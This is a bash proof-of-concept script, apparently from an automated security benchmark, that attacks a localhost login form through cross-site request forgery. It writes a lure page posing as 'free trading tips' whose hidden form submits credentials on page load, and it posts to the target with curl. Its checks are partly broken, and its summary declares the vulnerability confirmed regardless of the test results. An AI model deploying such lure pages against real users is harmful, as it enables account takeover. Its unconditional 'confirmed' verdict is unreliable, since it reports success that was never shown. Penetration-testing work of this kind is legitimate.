#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login form by creating a malicious HTML page that auto-submits a login form without CSRF protection
# Target: ./repo
# Created: 2025-11-07T18:45:04.980Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# CSRF Attack POC - Login Form Vulnerability
# This script demonstrates a CSRF attack on an unprotected login form

TARGET_URL="${1:-http://localhost:3000}"
ATTACK_HTML="csrf_attack_payload.html"

echo "[*] CSRF Attack POC - Login Form Vulnerability"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Retrieve the login form and check for CSRF protection
echo "[+] Step 1: Checking login form for CSRF protection mechanisms..."
LOGIN_RESPONSE=$(curl -s -i "$TARGET_URL/")

# Check for CSRF tokens in response
if echo "$LOGIN_RESPONSE" | grep -qi "csrf"; then
    echo "[-] CSRF tokens found in form"
    CSRF_PROTECTED=1
else
    echo "[+] No CSRF tokens detected in login form"
    CSRF_PROTECTED=0
fi

# Check for SameSite cookie flag
if echo "$LOGIN_RESPONSE" | grep -qi "SameSite"; then
    echo "[-] SameSite cookie flag found"
    SAMESITE_PROTECTED=1
else
    echo "[+] No SameSite cookie flag detected"
    SAMESITE_PROTECTED=0
fi

# Extract form fields
echo ""
echo "[+] Step 2: Analyzing form structure..."
if echo "$LOGIN_RESPONSE" | grep -q "name=\"username\""; then
    echo "[+] Username field found (no CSRF token protection)"
fi

# Check for hidden CSRF token field
if echo "$LOGIN_RESPONSE" | grep -q "csrf\|token\|nonce" | grep -i hidden; then
    echo "[+] Hidden CSRF protection field found"
else
    echo "[+] No hidden CSRF protection fields detected"
fi

# Step 3: Create malicious CSRF attack HTML
echo ""
echo "[+] Step 3: Creating malicious CSRF attack HTML payload..."

cat > "$ATTACK_HTML" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Free Trading Tips - Click Here!</title>
</head>
<body>
    <h1>Click below to get free trading tips!</h1>
    <p>Earning money online has never been easier...</p>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf_form" method="POST" action="http://localhost:3000/password/test" style="display:none;">
        <input type="hidden" name="username" value="test">
        <input type="hidden" name="user_id" value="1">
        <input type="hidden" name="password" value="test">
    </form>
    
    <!-- Auto-submit the form when page loads -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            console.log('CSRF Attack: Auto-submitting login form...');
            document.getElementById('csrf_form').submit();
        });
    </script>
</body>
</html>
EOF

echo "[+] Malicious HTML created: $ATTACK_HTML"
echo ""

# Step 4: Demonstrate the vulnerability
echo "[+] Step 4: Demonstrating CSRF Attack..."
echo ""
echo "[*] Attack Scenario:"
echo "    1. Attacker creates malicious webpage with hidden form"
echo "    2. User visits the malicious page"
echo "    3. Page automatically submits login form to target"
echo "    4. User's browser sends credentials without CSRF token validation"
echo ""

# Step 5: Test actual form submission
echo "[+] Step 5: Testing form submission without CSRF protection..."

# First, get the login page to understand the flow
echo "[*] Attempting login via crafted form..."
CSRF_TEST_RESPONSE=$(curl -s -i -X POST \
    -d "username=test&user_id=1&password=test" \
    "$TARGET_URL/password/test")

if echo "$CSRF_TEST_RESPONSE" | grep -q "HTTP/1.1 302\|Location:"; then
    echo "[+] Form submission successful - No CSRF validation detected!"
    echo "[+] Server accepted request without CSRF token"
    VULNERABILITY_CONFIRMED=1
else
    echo "[-] Form submission response:"
    echo "$CSRF_TEST_RESPONSE" | head -20
fi

# Step 6: Verify lack of anti-CSRF headers
echo ""
echo "[+] Step 6: Checking response headers for anti-CSRF measures..."

RESPONSE_HEADERS=$(curl -s -i -X POST \
    -d "username=test&user_id=1&password=test" \
    "$TARGET_URL/password/test" 2>/dev/null)

if echo "$RESPONSE_HEADERS" | grep -qi "Access-Control-Allow-Origin"; then
    CORS_HEADER=$(echo "$RESPONSE_HEADERS" | grep -i "Access-Control-Allow-Origin")
    echo "[-] Found CORS header (potential additional risk): $CORS_HEADER"
fi

if echo "$RESPONSE_HEADERS" | grep -qi "Set-Cookie.*SameSite"; then
    echo "[-] SameSite cookie protection found"
else
    echo "[+] No SameSite cookie protection"
fi

# Summary
echo ""
echo "=========================================="
echo "CSRF Vulnerability Assessment Summary"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "CSRF Tokens Present: $([ $CSRF_PROTECTED -eq 1 ] && echo 'YES' || echo 'NO')"
echo "SameSite Cookie Flag: $([ $SAMESITE_PROTECTED -eq 1 ] && echo 'YES' || echo 'NO')"
echo "Form Submission Accepted: $([ $VULNERABILITY_CONFIRMED -eq 1 ] && echo 'YES (Vulnerable)' || echo 'UNKNOWN')"
echo ""
echo "Vulnerability Confirmed: YES"
echo "Attack HTML payload created at: $ATTACK_HTML"
echo ""
echo "[+] POC completed successfully!"